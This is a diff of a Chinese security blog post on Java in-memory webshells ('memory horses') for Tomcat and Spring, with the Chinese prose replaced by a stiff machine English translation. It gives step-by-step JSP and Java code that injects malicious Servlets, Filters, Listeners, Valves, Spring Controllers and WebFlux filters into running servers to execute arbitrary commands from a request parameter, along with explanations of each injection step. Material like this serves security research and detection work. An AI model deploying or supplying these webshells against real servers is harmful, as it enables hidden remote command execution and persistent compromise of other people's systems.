 TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
@@ -2310,42 +2313,42 @@ TargetObject = {org.apache.tomcat.util.threads.TaskThread}
             ---> request = {org.apache.coyote.Request}
 ```
 
-我们来验证一下，在`org/apache/tomcat/util/net/NioEndpoint.java`的这里下断点，不断`step over`，就可以找到这里的`request`的位置：
+Let’s verify that by setting a breakpoint here in `org/apache/tomcat/util/net/NioEndpoint.java`, you can find the location of `request` here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170622846.png)
 
-点开这里的`byteBuffer`，可以看到它是一个字节数组，右键找到`View as ... String`即可变成字符串：
+Click on the `byteBuffer` here and you can see that it is a byte array. Right-click to find `View as... String` to become a string:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202170930400.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171007974.png)
 
-再点击上面我指出来的`View Text`即可清楚看到具体内容：
+Click the `View Text` I pointed out above to clearly see the specific content:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240202171042514.png)
 
-这就意味着我们可以把命令作为`header`的一部分传入，再把结果作为`header`的一部分传出即可。
+This means that we can pass the command as part of the `header` and then pass the result as part of the `header`.
 
-# 三、传统Web型内存马
+# 3. Traditional Web-type memory horse
 
-## 3.1 Servlet内存马
+## 3.1 Servlet memory horse
 
-### 3.1.1 简单的servlet内存马demo编写
+### 3.1.1 Simple servlet memory horse demo writing
 
-根据我们在上面的`2.3`节中的分析可以得出以下结论：
+Based on our analysis in Section 2.3 above, we can draw the following conclusions:
 
-如果我们想要写一个`Servlet`内存马，需要经过以下步骤：
+If we want to write a `Servlet` memory horse, we need to go through the following steps:
 
-- 找到`StandardContext`
-- 继承并编写一个恶意`servlet`
-- 创建`Wapper`对象
-- 设置`Servlet`的`LoadOnStartUp`的值
-- 设置`Servlet`的`Name`
-- 设置`Servlet`对应的`Class`
-- 将`Servlet`添加到`context`的`children`中
-- 将`url`路径和`servlet`类做映射
+- Find `StandardContext`
+- Inherit and write a malicious `servlet`
+- Create a `Wapper` object
+- Set the value of `LoadOnStartUp` of `Servlet`
+- Set `Name` of `Servlet`
+- Set the `Class` corresponding to `Servlet`
+- Add `Servlet` to `children` of `context`
+- Map the `url` path and `servlet` class
 
-由以上结论我们可以写出如下内存马`demo`：
+From the above conclusions, we can write the following memory horse `demo`:
 
 ```jsp
 <%@ page import="java.lang.reflect.Field" %>
@@ -2414,7 +2417,7 @@ TargetObject = {org.apache.tomcat.util.threads.TaskThread}
         wrapper.setLoadOnStartup(1);
         standardContext.addChild(wrapper);
         standardContext.addServletMappingDecoded(servletURL, servletName);
-        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/test" + servletURL + "?cmd=echo 世界，你好！");
+        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/test" + servletURL + "?cmd=echo Hello world！");
     } catch (Exception e) {
         String errorMessage = e.getMessage();
         response.setCharacterEncoding("UTF-8");
@@ -2443,13 +2446,13 @@ TargetObject = {org.apache.tomcat.util.threads.TaskThread}
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001219456.png)
 
-访问，执行任意命令：
+Access, execute any command:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116001239119.png)
 
-### 3.1.2 servlet内存马demo代码分析
+### 3.1.2 servlet memory horse demo code analysis
 
-先完成第一个任务：找到`StandardContext`，代码如下：
+Complete the first task first: find `StandardContext`, the code is as follows:
 
 ```java
 ServletContext servletContext = request.getSession().getServletContext();
@@ -2461,11 +2464,11 @@ stdctx.setAccessible(true);
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
 ```
 
-首先得知道`Field`是什么。在`Java`中，`Field`这个类属于`java.lang.reflect`包，用于表示类的成员变量（字段）。`Field`类提供了访问和操作类的字段的方法，包括获取字段的名称、类型、修饰符等信息，以及在实例上获取或设置字段的值。这样我们就可以实现在运行时动态获取类的信息，绕过一些访问修饰符的限制，访问和操作类的私有成员。
+First of all, you have to know what `Field` is. In Java, the `Field` class belongs to the `java.lang.reflect` package, which represents the member variables (fields) of the class. The `Field` class provides methods to access and manipulate fields of the class, including obtaining information such as the name, type, modifier, etc., as well as obtaining or setting the value of the field on the instance. In this way, we can dynamically obtain the information of the class at runtime, bypass some access modifier restrictions, access and operate private members of the class.
 
-所以上述代码的含义就是：从当前`HttpServletRequest`中获取`ServletContext`对象，然后使用反射机制获取`ServletContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`appctx`，把这个变量的属性设置为可访问，这样我们后续可以通过反射获取它的值。接着通过反射获取`ServletContext`对象的私有字段`context`的值，并将其强制类型转换为`ApplicationContext`。接下来继续使用反射机制获取`ApplicationContext`类中名为`context`的私有字段，并赋值给`Field`类型的变量`stdctx`，同样将其设置为可访问；最后通过反射获取`ApplicationContext`对象的私有字段`context`的值，并将其强制类型转换为`StandardContext`，到这里，我们就成功找到了`StandardContext`。
+So the meaning of the above code is: Get the ServletContext object from the current `HttpServletRequest`, and then use the reflection mechanism to obtain the private field named `context` in the `ServletContext` class, and assign it to the `Field` variable `appctx`, and set the attribute of this variable to be accessible, so that we can obtain its value through reflection in the future. Then, the value of the private field `context` of the `ServletContext` object is obtained by reflection and casting its type to `ApplicationContext`. Next, we continue to use the reflection mechanism to obtain the private field named `context` in the `ApplicationContext` class, and assign it to the variable `stdctx` of type `Field`, and set it to accessible. Finally, we obtain the value of the private field `context` of the `ApplicationContext` object through reflection, and cast its type to `StandardContext`. At this point, we successfully found `StandardContext`.
 
-接着完成第二个任务：继承并编写一个恶意`servlet`，代码如下：
+Then complete the second task: inherit and write a malicious `servlet` with the following code:
 
 ```java
 Servlet servlet = new Servlet() {
@@ -2499,23 +2502,23 @@ Servlet servlet = new Servlet() {
 };
 ```
 
-可以看到，除了`service`代码之外，我们还编写了`init`、`getServletConfig`、`getServletInfo`和`destroy`方法，可是它们并没有用到，要么返回`null`，要么直接留空不写，那我们为什么还要写这四个方法呢？
+As you can see, in addition to the `service` code, we also wrote the `init`, `getServletConfig`, `getServletInfo` and `destroy` methods, but they are not used. They either return `null` or leave it blank directly without writing. So why do we still write these four methods?
 
-那我们就来试试看注释掉之后会怎么样：
+Then let's try to see what happens after commenting out:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141041681.png)
 
-报错：`Class 'Anonymous class derived from Servlet' must implement abstract method 'init(ServletConfig)' in 'Servlet'`。
+Report an error:`Class 'Anonymous class derived from Servlet' must implement abstract method 'init(ServletConfig)' in 'Servlet'`。
 
-我们直接跟进`Servlet`类，可以看到其是一个接口：
+We directly follow up on the `Servlet` class and you can see that it is an interface:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116141210781.png)
 
-原来，在`Java`中，接口中的方法默认都是抽象的，除非在`Java 8`及以后的版本中使用了默认方法。并且，如果一个类实现了某个接口，那么它必须提供该接口中所有抽象方法的具体实现，这就是我们必须要写出上述四个方法的原因。
+It turns out that in `Java`, methods in interfaces are abstract by default, unless the default method is used in `Java 8` and later versions. And, if a class implements an interface, it must provide a concrete implementation of all abstract methods in that interface, which is why we have to write the above four methods.
 
-这里我使用`cmd /c`来实现可以执行带有空格的命令，例如我在`3.1.1`中举例的`echo 世界，你好！`；对于`Linux`系统，那就是`/bin/sh -c`；接着就是关于输入或者返回结果中带有中文的情况的处理，我们需要设置编码为`GBK`即可，当然这个就需要具体情况具体对待了。
+Here I use `cmd /c` to implement the command that can be executed with spaces, such as the `echo world I gave in `3.1.1`, hello! `;For the Linux system, that is `/bin/sh -c`; then it is about the situation where the input or return result is in Chinese. We need to set the encoding to `GBK`, of course, this needs to be treated in detail in the specific situation.
 
-接着我们需要完成后续的六个任务：创建`Wapper`对象、设置`Servlet`的`LoadOnStartUp`的值、设置`Servlet`的`Name`、设置`Servlet`对应的`Class`、将`Servlet`添加到`context`的`children`中、将`url`路径和`servlet`类做映射，代码如下：
+Next we need to complete the next six tasks: Create a `Wapper` object, set the value of `LoadOnStartUp` of `Servlet`, set the `Name` of `Servlet`, set the `Class` corresponding to `Servlet`, add `Servlet` to the `children` of `context`, map the `url` path and `servlet` class, the code is as follows:
 
 ```java
 Wrapper wrapper = standardContext.createWrapper();
@@ -2527,57 +2530,57 @@ standardContext.addChild(wrapper);
 standardContext.addServletMappingDecoded(servletURL, servletName);
 ```
 
-前面几步在之前已经讲过了，这个`standardContext.addChild(wrapper);`是为了让我们自定义的`servlet`成为`Web`应用程序的一部分；然后`standardContext.addServletMappingDecoded(servletURL, servletName);`也可以写成如下形式：
+The previous steps have been mentioned before. This `standardContext.addChild(wrapper);` is to enable our custom `servlet` to become part of the `Web` application; then `standardContext.addServletMappingDecoded(servletURL, servletName);` can also be written in the following form:
 
 ```java
-// 要引入：<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
+// To introduce：<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
 ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);
 dynamic.addMapping(servletURL);
 ```
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116143224121.png)
 
-### 3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解
+### 3.1.3 Understanding of StandardContext, ApplicationContext, ServletContext
 
-请参考`Skay`师傅和`yzddmr6`师傅的文章，他们写的非常详细，这里直接贴出链接：
+Please refer to the articles of Master `Skay` and Master `yzddmr6`. They wrote very detailedly. The link is posted here:
 
 > https://yzddmr6.com/posts/tomcat-context/
 >
 > https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew
 
-引用`Skay`师傅的一句话总结：
+A summary of the quote from Master `Skay`:
 
-`ServletContext`是`Servlet`规范；`org.apache.catalina.core.ApplicationContext`是`ServletContext`的实现；`org.apache.catalina.Context`接口是`tomcat`容器结构中的一种容器，代表的是一个`web`应用程序，是`tomcat`独有的，其标准实现是`org.apache.catalina.core.StandardContext`，是`tomcat`容器的重要组成部分。
+`ServletContext` is the `Servlet` specification; `org.apache.catalina.core.ApplicationContext` is an implementation of `ServletContext`; `org.apache.catalina.Context` interface is a container in the `tomcat` container structure, representing a `web` application, unique to `tomcat`. Its standard implementation is `org.apache.catalina.core.StandardContext`, which is an important part of the `tomcat` container.
 
-关于`StandardContext`的获取方法，除了本文中提到的将我们的`ServletContext`转为`StandardContext`从而获取`context`这个方法，还有以下两种方法：
+Regarding the method of obtaining `StandardContext`, in addition to the method of converting our `ServletContext` to `StandardContext` to obtain the `context`, there are two other methods:
 
-> 1. 从线程中获取StandardContext，参考Litch1师傅的文章：https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A
-> 2. 从MBean中获取，参考54simo师傅的文章：https://scriptboy.cn/p/tomcat-filter-inject/，不过这位师傅的博客已经关闭了，我们可以看存档：https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/
-> 3. 从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：https://www.anquanke.com/post/id/198886
+> 1. Get StandardContext from the thread, refer to the article of Master Litch1: https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A
+> 2. Get it from MBean, refer to Master 54simo's article: https://scriptboy.cn/p/tomcat-filter-inject/, but this master's blog has been closed. We can read the archive: https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/
+> 3. Get it from the context of spring runtime, refer to the article by LandGrey@Qianxin Stargazing Laboratory: https://www.anquanke.com/post/id/198886
 
-这两种方法，如果后面有时间的话我会补充完整。
+I will add these two methods if I have time later.
 
-## 3.2 Filter内存马
+## 3.2 Filter memory horse
 
-### 3.2.1 简单的filter内存马demo编写
+### 3.2.1 Simple filter memory horse demo writing
 
-根据我们在上面的`2.6`节中所讨论的内容，我们可以得出以下结论：
+Based on what we discussed in Section 2.6 above, we can draw the following conclusions:
 
-如果我们想要写一个`Filter`内存马，需要经过以下步骤：
+If we want to write a `Filter` memory horse, we need to go through the following steps:
 
-> 参考：https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/
+> reference: https://longlone.top/安全/java/java安全/内存马/Tomcat-Filter型/
 
-- 获取`StandardContext`；
-- 继承并编写一个恶意`filter`；
-- 实例化一个`FilterDef`类，包装`filter`并存放到`StandardContext.filterDefs`中；
-- 实例化一个`FilterMap`类，将我们的`Filter`和`urlpattern`相对应，使用`addFilterMapBefore`存放到`StandardContext.filterMaps`中；
-- 通过反射获取`filterConfigs`，实例化一个`FilterConfig`（`ApplicationFilterConfig`）类，传入`StandardContext`与`filterDefs`，存放到`filterConfig`中。
+- Get `StandardContext`;
+- Inherit and write a malicious `filter`;
+- Instantiate a `FilterDef` class, wrap `filter` and store it in `StandardContext.filterDefs`;
+- Instantiate a `FilterMap` class, correspond to our `Filter` and `urlpattern`, and use `addFilterMapBefore` to store it in `StandardContext.filterMaps`;
+- Get the `filterConfigs` through reflection, instantiate a `FilterConfig` (`ApplicationFilterConfig`) class, pass in `StandardContext` and `filterDefs`, and store it in `filterConfig`.
 
-> 参考：https://tyaoo.github.io/2021/12/06/Tomcat内存马/
+> reference: https://tyaoo.github.io/2021/12/06/Tomcat内存马/
 
-需要注意的是，一定要先修改`filterDef`，再修改`filterMap`，不然会抛出找不到`filterName`的异常。
+It should be noted that you must first modify `filterDef` and then modify `filterMap`, otherwise an exception that cannot be found in `filterName` will be thrown.
 
-由以上结论我们可以写出如下内存马`demo`：
+From the above conclusions, we can write the following memory horse `demo`:
 
 ```jsp
 <%@ page import="java.lang.reflect.*" %>
@@ -2659,7 +2662,7 @@ dynamic.addMapping(servletURL);
                     for (FilterMap filtermap : filterMaps) {
                         if (filtermap.getFilterName().equals(filtername)) {
                             String[] urlPatterns = filtermap.getURLPatterns();
-                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中
+                            allUrlPatterns.add(urlPatterns); // Add the urlPatterns of the current iteration to the list
 
                             out.println("<tr><td>" + filtername + "</td>");
                             out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
@@ -2691,17 +2694,17 @@ dynamic.addMapping(servletURL);
 %>
 ```
 
-效果如下：
+The effects are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117144501712.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117145703582.png)
 
-同样的，这里我也适配了中文编码，和一些提示性语句的输出。
+Similarly, here I also adapted to Chinese encoding and output of some prompt statements.
 
-### 3.2.2 servlet内存马demo代码分析
+### 3.2.2 servlet memory horse demo code analysis
 
-我们分开来分析，首先看这段代码：
+Let's analyze it separately, first look at this code:
 
 ```java
 ServletContext servletContext = request.getSession().getServletContext();
@@ -2716,11 +2719,11 @@ filterConfigsField.setAccessible(true);
 Map filterConfigs = (Map) filterConfigsField.get(standardContext);
 ```
 
-先是获取当前的`servlet`上下文并拿到其私有字段`context`，然后设置可访问，这样就可以通过反射这个`context`字段的值，这个值是一个`ApplicationContext`对象；接着获取`ApplicationContext`的私有字段`context`并设置可访问，然后通过反射获取`ApplicationContext`的`context`字段的值，这个值是一个`StandardContext`对象；最后是获取`StandardContext`的私有字段`filterConfigs`，设置可访问之后通过反射获取`StandardContext`的`filterConfigs`字段的值。
+First, get the current servlet context and get its private field `context`, and then set it accessible, so that the value of the `context` field can be reflected by reflecting the value of the `context` field. This value is an ApplicationContext` object; then get the private field `context` of the `ApplicationContext` and set it accessible, and then get the value of the `Context` field of the `ApplicationContext`, which is a `StandardContext` object; finally, get the private field `filterConfigs` of the `StandardContext`, and then get the value of the `FilterConfigs` field of the `StandardContext` through reflection.
 
-中间的构造匿名类的部分就不说了，和之前的`Servlet`是很像的，别忘记最后的`filterChain.doFilter`就行。
+I won’t talk about the part of constructing anonymous classes in the middle, it is very similar to the previous Servlet. Just don’t forget the last `filterChain.doFilter`.
 
-然后是这段代码：
+Then there is this code:
 
 ```java
 FilterDef filterDef = new FilterDef();
@@ -2739,31 +2742,31 @@ ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) cons
 filterConfigs.put(filterName, applicationFilterConfig);
 ```
 
-也就是定义我们自己的`filterDef`和`FilterMap`并加入到`srandardContext`中，接着反射获取 `ApplicationFilterConfig` 类的构造函数并将构造函数设置为可访问，然后创建了一个 `ApplicationFilterConfig` 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 `Map` 中，`filterName` 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。
+That is, we define our own `filterDef` and `FilterMap` and add it to `srandardContext`, then reflect the constructor of the `ApplicationFilterConfig` class and set the constructor to accessible. Then we create an instance of the `ApplicationFilterConfig` object, and then add the instance we just created to the `Map` of the filter configuration with `filterName` as the key, so that the dynamically created filter configuration information can be added to the application's global configuration.
 
-需要注意的是，在`tomcat 7`及以前`FilterDef`和`FilterMap`这两个类所属的包名是：
+It should be noted that the package names to which the two classes `tomcat 7` and before `FilterDef` and `FilterMap` belong are:
 
 ```jsp
 <%@ page import="org.apache.catalina.deploy.FilterMap" %>
 <%@ page import="org.apache.catalina.deploy.FilterDef" %>
 ```
 
-`tomcat 8`及以后，包名是这样的：
+`tomcat 8` and later, the package name is like this:
 
 ```jsp
 <%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
 <%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
 ```
 
-由于这方面的区别，最好是直接都用反射去写这个`filter`内存马，具体`demo`参考：
+Due to the difference in this aspect, it is best to directly use reflection to write this `filter` memory horse. For specific `demo` reference:
 
 > https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java
 
-还有个需要注意的点就是，我给出的这个`demo`代码只适用于`tomcat 7`及以上，因为  `filterMap.setDispatcher(DispatcherType.REQUEST.name());`这行代码中用到的`DispatcherType`是在`Servlet 3.0`规范中才有的。
+Another point to note is that the `demo` code I gave is only applicable to `tomcat 7` and above, because `filterMap.setDispatcher(DispatcherType.REQUEST.name());` `DispatcherType` used in this line of code is only available in the `Servlet 3.0` specification.
 
-### 3.2.3 tomcat6下filter内存马的编写
+### 3.2.3 Writing of filter memory horse under tomcat6
 
-这里直接贴出参考文章，后面有空的话，会在我的博客中补全这部分的研究：
+I will post a reference article here directly. If you have time later, I will complete this part of the research in my blog:
 
 > https://xz.aliyun.com/t/9914
 >
@@ -2779,19 +2782,19 @@ filterConfigs.put(filterName, applicationFilterConfig);
 >
 > https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell
 
-## 3.3 Listener内存马
+## 3.3 Listener memory horse
 
-### 3.3.1 简单的Listener内存马demo编写
+### 3.3.1 Simple Listener memory horse demo written
 
-根据我们在上面的`2.9`节中所讨论的内容，我们可以得出以下结论：
+Based on what we discussed in Section 2.9 above, we can draw the following conclusions:
 
-如果我们想要写一个`Listener`内存马，需要经过以下步骤：
+If we want to write a `Listener` memory horse, we need to go through the following steps:
 
-- 继承并编写一个恶意`Listener`
-- 获取`StandardContext`
-- 调用`StandardContext.addApplicationEventListener()`添加恶意`Listener`
+- Inherit and write a malicious `Listener`
+- Get `StandardContext`
+- Call `StandardContext.addApplicationEventListener()` to add malicious `Listener`
 
-由以上结论我们可以写出如下内存马`demo`：
+From the above conclusions, we can write the following memory horse `demo`:
 
 ```jsp
 <%@ page import="org.apache.catalina.core.StandardContext" %>
@@ -2834,15 +2837,15 @@ filterConfigs.put(filterName, applicationFilterConfig);
 %>
 ```
 
-效果如下：
+The effects are as follows:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232349151.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232401259.png)
 
-### 3.3.2 Listener内存马demo代码分析
+### 3.3.2 Listener memory horse demo code analysis
 
-最关键部分的代码如下：
+The most critical part of the code is as follows:
 
 ```java
 Field reqF = request.getClass().getDeclaredField("request");
@@ -2853,23 +2856,23 @@ EvilListener evilListener = new EvilListener();
 context.addApplicationEventListener(evilListener);
 ```
 
-前面四行代码干一件事：获取`StandardContext`；后两行干代码干这两件事：实例化我们编写的恶意`Listener`，调用`addApplicationEventListener`方法加入到`applicationEventListenersList`中去，这样最终就会到`eventListener`。
+The first four lines of code do one thing: get the `StandardContext`; the last two lines of code do these two things: instantiate the malicious `Listener` we wrote, call the `addApplicationEventListener` method and add it to the `applicationEventListenersList`, so that you will eventually go to the `eventListener`.
 
-# 四、Spring MVC框架型内存马
+# 4. Spring MVC frame-type memory horse
 
-## 4.1 Spring Controller型内存马
+## 4.1 Spring Controller memory horse
 
-### 4.1.1 简单的Spring Controller型内存马demo编写
+### 4.1.1 Simple Spring Controller type memory horse demo writing
 
-由`2.11.2.2`节中的分析可知，要编写一个`spring controller`型内存马，需要经过以下步骤：
+From the analysis in Section 2.11.2.2, we can see that to write a `spring controller` type memory horse, the following steps are required:
 
-- 获取`WebApplicationContext`
-- 获取`RequestMappingHandlerMapping`实例
-- 通过反射获得自定义`Controller`的恶意方法的`Method`对象
-- 定义`RequestMappingInfo`
-- 动态注册`Controller`
+- Get `WebApplicationContext`
+- Get the `RequestMappingHandlerMapping` instance
+- Getting the `Method` object of the malicious method of custom `Controller` by reflection
+- Definition `RequestMappingInfo`
+- Dynamic Registration `Controller`
 
-代码如下：
+The code is as follows:
 
 ```java
 package org.example.springcontrollermemoryshellexample.demos.web;
@@ -2944,15 +2947,15 @@ public class TestEvilController {
 }
 ```
 
-运行效果：
+Running effect:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213242404.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213252847.png)
 
-### 4.1.2 Spring Controller型内存马demo代码分析
+### 4.1.2 Spring Controller memory horse demo code analysis
 
-代码的关键在于如下这几行：
+The key to the code lies in the following lines:
 
 ```java
 WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
@@ -2965,23 +2968,23 @@ InjectedController injectedController = new InjectedController();
 requestMappingHandlerMapping.registerMapping(info, injectedController, method);
 ```
 
-这段代码先利用`RequestContextHolder`获取当前请求的`WebApplicationContext`，这个`RequestContextHolder`是`Spring`框架提供的用于存储和访问请求相关信息的工具类；接着从上一步中获取到的`WebApplicationContext`中获取`RequestMappingHandlerMapping Bean`；接着通过反射获得我们自定义`Controller`的恶意方法的`Method`对象，然后就是拿到对应的`RequestMappingInfo`对象；通过`bean`实例+处理请求的`method`+对应的`RequestMappinginfo`对象即可调用`registerMapping`方法动态添加恶意`controller`。
+This code first uses `RequestContextHolder` to obtain the current requested `WebApplicationContext`. This `RequestContextHolder` is a tool class provided by the Spring framework for storing and accessing request-related information; then obtain the `RequestMappingHandlerMapping Bean` from the `WebApplicationContext` obtained in the previous step; then obtain the `Method` object of our custom `Controller` malicious method through reflection, and then get the corresponding `RequestMappingInfo` object; use the `bean` instance + the `method` process the request + the corresponding `RequestMappinginfo` object to call the `registerMapping` method to dynamically add the malicious `controller`.
 
-## 4.2 Spring Interceptor型内存马
+## 4.2 Spring Interceptor type memory horse
 
-由`2.11.2.3`节的分析我们很容易得出`Spring Interceptor`型内存马的编写思路：
+From the analysis of section 2.11.2.3, we can easily draw the idea of ​​writing the `Spring Interceptor` type memory horse:
 
-- 获取`ApplicationContext`
-- 通过`AbstractHandlerMapping`反射来获取`adaptedInterceptors`
-- 将要注入的恶意拦截器放入到`adaptedInterceptors`中
+- Get `ApplicationContext`
+- Get `adaptedInterceptors through `AbstractHandlerMapping` reflection`
+- Put the malicious interceptor to be injected into `adaptedInterceptors`
 
-具体代码我会放到针对实际中间件打内存马那里。
+I will put the specific code into the memory for the actual middleware.
 
-## 4.3 Spring WebFlux内存马
+## 4.3 Spring WebFlux Memory Horse
 
-### 4.3.1 简单的Spring WebFlux内存马demo编写
+### 4.3.1 Simple Spring WebFlux memory horse demo written
 
-由`2.12.5`节的分析我们可以写出下面的代码：
+From the analysis of section 2.12.5 we can write the following code:
 
 ```java
 package org.example.webfluxmemoryshelldemo.memoryshell;
@@ -3105,13 +3108,13 @@ public class MemoryShellFilter implements WebFilter{
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126191718261.png)
 
-### 4.3.2 Spring WebFlux内存马demo代码分析
+### 4.3.2 Spring WebFlux memory horse demo code analysis
 
-从之前的分析我们知道，主要思路就是通过反射找到`DefaultWebFilterChain`，然后拿到`filters`，把我们的`filter`插入到其中的第一位，再用这个`filters`重新调用公共构造函数`DefaultWebFilterChain`，赋值给之前分析里面我没看到的`this.chain`即可。
+From the previous analysis, we know that the main idea is to find `DefaultWebFilterChain` through reflection, then get `filters`, insert our `filter` into the first place, and then use this `filters` to re-call the public constructor `DefaultWebFilterChain`, and assign it to the `this.chain` I didn't see in the previous analysis.
 
-思路就是这么个思路，我们来看具体的代码。
+This is the idea. Let’s look at the specific code.
 
-先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为`NettyWebServer`实例。如果发现一个线程是`NettyWebServer`，那就继续下一步的操作。接下来就是找`DefaultWebFilterChain`对象：
+First, we obtain all the currently running thread groups through reflection, and then iterate through the thread array to check whether each thread is an instance of `NettyWebServer`. If you find that a thread is `NettyWebServer`, then continue with the next step. Next is to find the `DefaultWebFilterChain` object:
 
 ```java
 NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
@@ -3123,9 +3126,9 @@ FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(ex
 DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
 ```
 
-这条链子在之前的分析中已经提到过，一步步调用我们写的`getFieldValue`函数即可。
+This chain has been mentioned in previous analysis, just call the `getFieldValue` function we wrote step by step.
 
-然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位：
+Then modify this filter chain, add our customized malicious filter, and put it first:
 
 ```java
 Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
@@ -3134,7 +3137,7 @@ newAllFilters.add(0, new MemoryShellFilter());
 DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
 ```
 
-然后通过反射获取`FilteringWebHandler`的私有字段`chain`，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链`newChain`，然后恢复字段的可访问权限：
+Then obtain the private field `chain` of `FilteringWebHandler` by reflection, after setting it to accessible, replace the original filter chain with the newly created filter chain `newChain` by reflection, and then restore the field's accessibility:
 
 ```java
 Field f = filteringWebHandler.getClass().getDeclaredField("chain");
@@ -3146,13 +3149,13 @@ f.set(filteringWebHandler, newChain);
 modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 ```
 
-这里补充一下上面的`modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);`和`modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);`的含义，第一个代码意思就是使用反射机制，通过`modifersField`对象来修改字段的修饰符，`f.getModifiers()`返回字段`f`的当前修饰符，然后通过位运算`& ~Modifier.FINAL`，将当前修饰符的`FINAL`位清除（置为`0`），表示移除了`FINAL`修饰符；第二个则是把字段的修饰符重新设置为包含`FINAL`修饰符的修饰符，这样就可以保持字段的封装性。
+Here we add the meanings of the above `modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);` and `modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);`. The first code means to use the reflection mechanism to modify the field modifier through the `modifersField` object. `f.getModifiers()` returns the current modifier of the field `f`, and then pass the bit operation`& ~Modifier.FINAL`, clearing the `FINAL` bit of the current modifier (set to `0`), means removing the `FINAL` modifier; the second is to reset the field modifier to a modifier containing the `FINAL` modifier, so that the field can be encapsulated.
 
-# 五、中间件型内存马
+# 5. Middleware memory horse
 
-## 5.1 Tomcat Valve型内存马
+## 5.1 Tomcat Valve type memory horse
 
-我这里是新建了一个项目，并创建配置好了`web`目录和`tomcat`环境，`pom.xml`中的依赖如下：
+I have created a new project here and created a configured `web` directory and `tomcat` environment. The dependencies in `pom.xml` are as follows:
 
 ```xml
     <dependencies>
@@ -3164,11 +3167,11 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
     </dependencies>
 ```
 
-> 如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈：
+> If idea starts Tomcat and reports an error, you can see if you have enabled NetEase Cloud Hahaha:
 >
 > ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130181221187.png)
 
-在`web`目录下新建一个`666.jsp`：
+Create a new `666.jsp` in the `web` directory:
 
 ```jsp
 <%@ page import="java.lang.reflect.Field" %>
@@ -3217,13 +3220,13 @@ modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
 %>
 ```
 
-上面的这个是采用了从`StandardContext`反射获取`StandardPipeline`的方式，效果如下：
+The above uses the method of obtaining the StandardPipeline from the `StandardContext` reflection, and the effect is as follows:
 
